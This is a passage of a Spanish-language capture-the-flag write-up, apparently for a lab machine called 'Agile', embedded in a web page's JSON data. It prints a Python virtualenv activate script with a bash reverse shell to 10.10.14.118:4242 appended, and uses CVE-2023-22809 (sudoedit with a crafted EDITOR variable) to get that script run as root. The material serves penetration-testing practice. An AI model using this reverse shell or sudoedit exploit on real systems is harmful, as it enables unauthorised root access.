siguiente forma (añadimos una shell reversa al final del script)\\n\\n~~~bash\\n# This file must be used with \\\"source bin/activate\\\" *from bash*\\n# you cannot run it directly\\n\\ndeactivate () {\\n    # reset old environment variables\\n    if [ -n \\\"${_OLD_VIRTUAL_PATH:-}\\\" ] ; then\\n        PATH=\\\"${_OLD_VIRTUAL_PATH:-}\\\"\\n        export PATH\\n        unset _OLD_VIRTUAL_PATH\\n    fi\\n    if [ -n \\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\" ] ; then\\n        PYTHONHOME=\\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\"\\n        export PYTHONHOME\\n        unset _OLD_VIRTUAL_PYTHONHOME\\n    fi\\n\\n    # This should detect bash and zsh, which have a hash command that must\\n    # be called to get it to forget past commands.  Without forgetting\\n    # past commands the $PATH changes we made may not be respected\\n    if [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n        hash -r 2\u003e /dev/null\\n    fi\\n\\n    if [ -n \\\"${_OLD_VIRTUAL_PS1:-}\\\" ] ; then\\n        PS1=\\\"${_OLD_VIRTUAL_PS1:-}\\\"\\n        export PS1\\n        unset _OLD_VIRTUAL_PS1\\n    fi\\n\\n    unset VIRTUAL_ENV\\n    unset VIRTUAL_ENV_PROMPT\\n    if [ ! \\\"${1:-}\\\" = \\\"nondestructive\\\" ] ; then\\n    # Self destruct!\\n        unset -f deactivate\\n    fi\\n}\\n\\n# unset irrelevant variables\\ndeactivate nondestructive\\n\\nVIRTUAL_ENV=\\\"/app/venv\\\"\\nexport VIRTUAL_ENV\\n\\n_OLD_VIRTUAL_PATH=\\\"$PATH\\\"\\nPATH=\\\"$VIRTUAL_ENV/bin:$PATH\\\"\\nexport PATH\\n\\n# unset PYTHONHOME if set\\n# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)\\n# could use `if (set -u; : $PYTHONHOME) ;` in bash\\nif [ -n \\\"${PYTHONHOME:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PYTHONHOME=\\\"${PYTHONHOME:-}\\\"\\n    unset PYTHONHOME\\nfi\\n\\nif [ -z \\\"${VIRTUAL_ENV_DISABLE_PROMPT:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PS1=\\\"${PS1:-}\\\"\\n    PS1=\\\"(venv) ${PS1:-}\\\"\\n    export PS1\\n    VIRTUAL_ENV_PROMPT=\\\"(venv) \\\"\\n    export VIRTUAL_ENV_PROMPT\\nfi\\n\\n# This should detect bash and zsh, which have a hash command that must\\n# be called to get it to forget past commands.  Without forgetting\\n# past commands the $PATH changes we made may not be respected\\nif [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n    hash -r 2\u003e /dev/null\\nfi\\n0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/10.10.14.118/4242; sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196\\n\\n~~~\\n\\nVerificamos la versión de sudo\\n\\n![](/Agile/Pasted_image_20230311000023.png)\\n\\n## Elevación de Privilegios\\n\\nPara escalar privilegios usamos una vulnerabilidad de sudoedit, especificamente esta:\\n\\n[CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809)\\n[Detalles de vulnerabilidad](https://www.openwall.com/lists/oss-security/2023/01/19/1)\\n\\nEn base al exploit creamos la siguiente variable de  entorno\\n\\n~~~bash\\nexport EDITOR=vim -- /app/venv/bin/activate\\n~~~\\n\\nLuego intentamos modificar el archivo creds.txt\\n\\n~~~bash\\nsudoedit -g dev_admin -u dev_admin /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nAgregamos la linea para nuestra reverse shell\\n\\n![](/Agile/Pasted_image_20230311000753.png)\\n\\nGuardamos\\n\\n![](/Agile/Pasted_image_20230311000618.png)\\n\\nUsamos netcat para esuchar alguna conexión en el puerto 4242 y esperamos unos minutos\\n\\n![](/Agile/Pasted_image_20230310235255.png)\\n\\nFinalmente obtenemos acceso al sistema como root\\n\"}"},"__N_SSG":true},"page":"/posts/post/[slug]","query":{"slug":"Agile"},"buildId":"8FBaA9tE3H2FwnNG4HFAa","assetPrefix":"/nextjs-github-pages","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
